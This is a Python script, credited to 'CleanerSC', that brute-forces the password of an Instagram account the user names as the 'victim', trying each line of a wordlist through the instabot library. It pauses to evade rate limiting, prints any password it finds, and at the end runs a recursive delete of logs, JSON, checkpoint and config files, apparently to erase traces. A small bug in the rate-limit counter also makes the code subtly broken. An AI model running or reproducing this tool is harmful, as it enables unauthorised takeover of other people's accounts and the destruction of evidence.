from instabot import Bot
from colorama import Fore, Style
import os, sys, time

# Este script esta publicado bajo licencia gratuita
# usted puede modificar y mejorar el codigo a voluntad
# unicamente no puede borrar el nombre del creador "CleanerSC"
# puede agregar su nombre en el banner pero no eliminar el autor
# disfruta mi script :D

def banner():
    os.system("clear")
    banner = f"""^^
                        ( o o )
+------------------.oooO--(_)--Oooo.------------------+
|                                                     |
|           &&Attack Brute force instagram^^              |
|              &&[   by CleanerSC    ]^^                  |
|              &&[   Version: 1.0    ]^^                  |
|                    .oooO                            |
|                    (   )   Oooo.                    |
+---------------------\ (----(   )--------------------+
                       \_)    ) /
                             (_/

""".replace("^^", Fore.BLUE).replace("&&", Fore.CYAN)

    print(banner)

def get_info():
    account = input("Enter victim's account: ")
    wordlist = input("Enter path wordlist defect = wordlist/wordlist.list: ")
    if wordlist == '':
        wordlist = "wordlist/wordlist.list"
    banner()
    if os.path.isfile(wordlist) == False:
        print(f"{Fore.GREEN}wordlist: {wordlist}............................................{Fore.RED}False")
        print(Fore.RED + "Don't found the wordlist")
        sys.exit()
    else:
        print(f"{Fore.GREEN}wordlist: {wordlist}............................................True")
        input(f"{Fore.BLUE}Press Enter to continue")
    return account, wordlist


def brute_force():
    account, wordlist = get_info()
    bot = Bot()
    banner()
    N = 0
    P = 500
    print(f"{Fore.CYAN} STARTING FORCE BRUTE ATTACK \n\n debug:{Style.RESET_ALL} ")
    with open(wordlist) as file:
         for Password in file.read().split("\n"):
             login = bot.login(username =account, password=Password)
             N+=1
             if login == True:
                 print(f"{Fore.GREEN} *******************Congratulations password founds***********************")
                 print(f"{Fore.GREEN}*******************user :{account} password :{Password}********************" + Style.RESET_ALL)
                 sys.exit()
             else:
                print(f"{Fore.RED}{Password}......................................Incorrect ", Style.RESET_ALL)
                time.sleep(2)
             if N == P:
                 print("too many requets please wait 300 seconds")
                 time.sleep(300)
                 p += 500

if __name__ == "__main__":
    banner()
    brute_force()
    os.system("rm -rvf *.txt *checkpoint* *.json *.log config")
    

